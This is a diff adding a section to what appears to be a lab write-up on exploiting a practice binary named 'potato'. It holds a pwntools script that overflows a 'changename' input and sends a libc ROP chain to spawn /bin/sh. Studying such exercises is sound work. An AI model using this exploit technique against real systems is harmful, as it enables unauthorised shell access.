@@ -643,4 +643,156 @@ $ $
 
 ### Custom shellcode or ROP chain
 
-**TODO**
+To find a ROP chain we can use the ROPGadget Tool again.
+For this we can run the following command.
+
+```bash
+$ ROPgadget --binary potato--ropchain
+[...]
+
+Unique gadgets found: 643
+
+ROP chain generation
+===========================================================
+
+- Step 1 -- Write-what-where gadgets
+
+        [-] Can't find the 'mov qword ptr [r64], r64' gadget
+
+```
+
+We can see that ROPGadget is looking for a possibility to chain gadgets together to make the execution of a shell possible. With just the potato binary we do not find enough gadgets to build a ROP chain.
+To find the necessary gadgets we can look at the dynamically linked libraries used by our program with `ldd`.
+
+```bash
+$ ldd potato   
+        linux-vdso.so.1 (0x00007f5a76017000)
+        libcrypto.so.3 => /lib/x86_64-linux-gnu/libcrypto.so.3 (0x00007f5a75a00000)
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5a7580a000)
+        libz.so.1 => /lib/x86_64-linux-gnu/libz.so.1 (0x00007f5a75fd9000)
+        libzstd.so.1 => /lib/x86_64-linux-gnu/libzstd.so.1 (0x00007f5a75742000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007f5a76019000)
+```
+For our use case we can take a look at the linked `libc.so.6`.
+
+```bash
+$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --ropchain
+
+[...]
+
+Unique gadgets found: 103072
+
+[...]
+```
+
+We can already see that we found a lot more gadgets. `ROPGadget` will build us a ROP chain. This chain can be used in our attack script, for this we simply need to add the offset in the generated ROP chain.
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+from struct import pack
+import sys
+
+
+elf = ELF("./potato_rop")
+
+process = elf.process(["console"], stdin=PTY, aslr=False) # stdin=PTY for "getpass" password input
+gdb.attach(process, '''
+continue
+''')
+
+print(process.recvuntil(b"cmd> ")) # username
+process.sendline(b"login")
+# test user
+process.sendline(b"peter")
+process.sendline(b"12345")
+print(process.recvuntil(b"cmd> ")) # username
+# logged in
+#p.interactive()
+process.sendline(b"changename")
+
+# Padding goes here
+p = b'\x41'*72
+
+p += pack('<Q', 0x000000000010d37d) # pop rdx ; ret
+p += pack('<Q', 0x00000000001e7000) # @ .data
+p += pack('<Q', 0x0000000000043067) # pop rax ; ret
+p += b'/bin//sh'
+p += pack('<Q', 0x0000000000038a7c) # mov qword ptr [rdx], rax ; ret
+p += pack('<Q', 0x000000000010d37d) # pop rdx ; ret
+p += pack('<Q', 0x00000000001e7008) # @ .data + 8
+p += pack('<Q', 0x00000000000b9a05) # xor rax, rax ; ret
+p += pack('<Q', 0x0000000000038a7c) # mov qword ptr [rdx], rax ; ret
+p += pack('<Q', 0x000000000002a205) # pop rdi ; ret
+p += pack('<Q', 0x00000000001e7000) # @ .data
+p += pack('<Q', 0x000000000002bb39) # pop rsi ; ret
+p += pack('<Q', 0x00000000001e7008) # @ .data + 8
+p += pack('<Q', 0x000000000010d37d) # pop rdx ; ret
+p += pack('<Q', 0x00000000001e7008) # @ .data + 8
+p += pack('<Q', 0x00000000000b9a05) # xor rax, rax ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000284a6) # syscall
+
+process.sendline(p)
+
+process.interactive()
+```
